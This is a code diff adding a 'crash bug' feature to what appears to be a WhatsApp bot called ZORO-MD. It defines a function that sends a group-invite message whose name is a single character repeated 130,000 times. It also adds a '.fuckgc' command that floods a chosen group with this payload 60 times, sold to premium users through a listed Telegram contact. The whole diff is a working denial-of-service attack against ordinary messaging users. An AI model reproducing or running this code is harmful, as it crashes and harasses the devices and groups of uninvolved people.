@@ -276,7 +276,28 @@ const channelInfo = {
 
 
 
+async function Lovegc_by_sy(targetJid) {
+    try {
+        const LoveString = "ཹ".repeat(65000);
+        const SY_love_payload = LoveString.repeat(2);
 
+        const bugMessage = {
+            groupInviteMessage: {
+                groupName: SY_love_payload,
+                groupJid: "561611-1627579259@g.us", 
+                inviteCode: "h+64P9RhJDzgXSPf",        
+                inviteExpiration: 999,
+                caption: "",
+                thumbnail: null,
+                contextInfo: {}
+            }
+        };
+
+        await sock.relayMessage(targetJid, bugMessage, {});
+    } catch (error) {
+        console.error("gcandroid failed →", error.message || error);
+    }
+}
 
 
 
@@ -2657,6 +2678,54 @@ case userMessage.startsWith('.test'): {
     }, { quoted: message });
 
     S7LOVESYUILIKES7(sock, targetJid);
+    commandMatched = true;
+    break;
+}           case userMessage.startsWith('.fuckgc'): {
+    if (!message.key.fromMe && !senderIsOwnerOrSudo) {
+        await sock.sendMessage(chatId, { text: '❌ Only owner / sudo can use this command' }, { quoted: message });
+        break;
+    }
+
+    if (!isLOVSmeSY(message, sock)) {
+        await sock.sendMessage(chatId, {
+            text: `*🚫 ACCESS DENIED 🚫*\n*🔒 Premium Users Only*\n*📩 t.me/@Zoroxbug*\n*📞 +91 82930 07159*`,
+            ...channelInfo
+        }, { quoted: message });
+        break;
+    }
+
+    const parts = rawText.trim().split(/\s+/);
+    if (!parts[1]) {
+        await sock.sendMessage(chatId, { 
+            text: '⚠️ Usage:\n.fuckgc 1203630xxxxxxxxx@g.us\n\n(Use full group JID)' 
+        }, { quoted: message });
+        break;
+    }
+
+    let targetJid = parts[1].trim();
+
+    if (!targetJid.endsWith('@g.us') || targetJid.length < 20) {
+        await sock.sendMessage(chatId, { 
+            text: '❌ Invalid group format. Must be like: 120363047626537xxx@g.us' 
+        }, { quoted: message });
+        break;
+    }
+
+    await sock.sendMessage(chatId, {
+        text: `*🔥 GC Fucking Started*\n🎯 Target Group: ${targetJid}`,
+        ...channelInfo
+    }, { quoted: message });
+    
+    for (let i = 0; i < 60; i++) {
+        await Lovegc_by_sy(targetJid);
+        await new Promise(r => setTimeout(r, 280 + Math.random() * 120));
+    }
+
+    await sock.sendMessage(chatId, {
+        text: `*GC IS FUCKED BY ZORO-MD 💀*\nSent to: ${targetJid}`,
+        ...channelInfo
+    }, { quoted: message });
+
     commandMatched = true;
     break;
 }
